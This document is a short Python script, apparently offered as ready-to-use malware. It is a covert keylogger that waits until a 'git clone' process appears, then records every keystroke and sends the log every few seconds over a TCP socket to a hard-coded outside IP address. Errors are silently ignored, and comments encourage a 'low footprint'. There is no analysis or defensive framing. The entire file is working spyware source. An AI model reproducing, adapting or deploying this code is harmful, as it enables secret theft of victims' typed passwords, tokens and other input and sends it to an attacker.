import subprocess
import pynput.keyboard as kb
import socket
import threading
import psutil
import time

# Your PC’s IP—swap this out
HOST ="94.191.138.93"  # Your IP here
PORT = 80

logs = []
logging_active = False

def send_logs():
    while True:
        if logs:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((HOST, PORT))
                    payload = "".join(logs).encode()
                    s.sendall(payload)
                logs.clear()
            except:
                pass
        time.sleep(5)

def on_press(key):
    if logging_active:
        try:
            logs.append(key.char)
        except AttributeError:
            logs.append(f"[{key}]")

def check_git():
    global logging_active
    while True:
        for proc in psutil.process_iter(["name"]):
            if"git" in proc.info["name"].lower() and"clone" in" ".join(proc.cmdline()).lower():
                if not logging_active:
                    logging_active = True
                    threading.Thread(target=send_logs, daemon=True).start()
                    listener = kb.Listener(on_press=on_press)
                    listener.start()
        time.sleep(1)

# Kick it off
threading.Thread(target=check_git, daemon=True).start()
while True:
    time.sleep(3600)  # Keep alive, low footprint